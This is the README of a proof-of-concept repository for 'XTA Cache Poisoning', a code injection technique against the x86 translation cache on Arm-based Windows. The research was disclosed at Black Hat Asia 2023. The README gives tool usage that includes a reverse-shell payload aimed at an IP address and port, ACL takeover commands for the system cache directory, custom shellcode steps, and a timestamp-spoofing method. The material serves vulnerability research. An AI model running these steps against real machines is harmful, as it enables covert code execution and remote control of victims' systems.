# XTA Cache Poisoning

## Introduction

Arm-based Windows has mechanisms to run x86/x64 applications by JIT binary translation. Typically, the JIT binary translation is time-consuming, so the translated blocks of code are saved to the storage and cached for the next application launch to improve the performance.

We presented a new code injection technique named "XTA Cache Poisoning" abusing this caching mechanism at [Black Hat Asia 2023](https://www.blackhat.com/asia-23/briefings/schedule/index.html#dirty-bin-cache-a-new-code-injection-poisoning-binary-translation-cache-30907). This repository contains the PoC code of XTA Cache Poisoning and other utilities used in my research.

## Requirements

- Visual Studio 2022
- Python 3.9 on Ubuntu 20.04 on WSL2 (for creating your own payload)
    - [poetry](https://python-poetry.org/) and [radare2](https://github.com/radareorg/radare2) are also required.

## How to build

Open XtacPoisoning.sln with Visual Studio 2022, then select "Build Solution" to compile all executables. Before compiling, you need to select the proper platform. For example, if you want to poison an XTA cache file of an x86 executable, you need to change the platform to x86.

## How to use the PoC code of XTA Cache Poisoning

You can use [PoisonXtac](./PoisonXtac/) to poison an XTA cache file. The usage of this tool is as follows.

```
> PoisonXtac.exe <path to target> <shellcode name> <shellcode parameters>
```

`<shellcode name>` must be one of the followings:

- revshell (it takes an IP address and port number as shellcode parameters.)
- calc (it takes no shellcode parameters.)
- msgbox (it takes no shellcode parameters.)
- custom (it takes paths of shellcode.bin and shellcode_rvas.txt as shellcode parameters. Please refer to ["How to create custom payload"](#how-to-create-custom-payload) to make shellcode.bin and shellcode_rvas.txt)

Example 1 (reverse shell)

```
> PoisonXtac.exe "C:\Users\ffri\Downloads\target.exe" revshell 192.168.0.2 8080
```

Example 2 (calc)

```
> PoisonXtac.exe "C:\Users\ffri\Downloads\target.exe" calc
```

## How to create custom payload

1. Write your own logic in the `ShellcodeEntry` function of [ShellcodeTemplate](./ShellcodeTemplate/Main.c). Then, build ShellcodeTemplate with Visual Studio 2022.

2. Open the command prompt with admin privileges, then run the following command to change the ACL of `%SystemRoot%\XtaCache` directory.

```
> takeown /f C:\Windows\XtaCache
> icacls C:\Windows\XtaCache /grant Administrators:F
```

3. Open the WSL terminal, then run the following command. This script runs the ShellcodeTemplate.exe to create an XTA cache file, then extract the information from it for XtacTranslateTool. After running this, shellcode.bin and shellcode_rvas.txt are created in the same directory as the `main.py` script.

```
$ poetry install
$ poetry run python main.py <x86/x64>
```

4. Test the generated shellcode works as expected. To check this, you can use [TestShellcode](./TestShellcode/).

```
> TestShellcode.exe <path to shellcode.bin>
```

5. Pass shellcode.bin and shellcode_rvas.txt as shellcode parameters to poison an XTA cache file of the target executable.

```
> PoisonXtac.exe "C:\Users\ffri\Downloads\target.exe" custom <path to shellcode.bin> <path to shellcode_rvas.txt>
```

## Other utilities

### [CalcHashes](./CalcHashes/)

This tool calculates the module header hash and module path hash of the specified x86/x64 executable. XtaCache service calculates these two hashes to check whether the specified executable was previously translated. If there is a previous translation result corresponding to the calculated hashes, the XtaCache service reuses the XTA cache file to reduce the amount of binary translation. For more details, see chapter 8 "X86 simulation on ARM64 platforms" of Windows Internals Part2 7th Edition and my Black Hat Asia 2023 talk slides.

### [NTFSTimestampsExperiment](./NTFSTimestampsExperiment/)

This tool is used to test the behavior of the NTFS filesystem's timestamp updates. It demonstrates that we can restore all timestamps (CreationTime, LastWriteTime, ChangeTime, and LastAccessTime of $SI and $FN in the directory) using NtSetInformationFile even if we modify the file contents. So, determining the file identity based on timestamps (not entire file contents) does not work on Windows. XtaCache service determines the file identity to check whether the specified binary was previously translated or not, but this check can be easily spoofed because it is based on the LastWriteTime timestamp, PE header, and NT device path name.

## Author

Koh M. Nakagawa. &copy; FFRI Security, Inc. 2023

## License

[Apache version 2.0](./LICENSE)
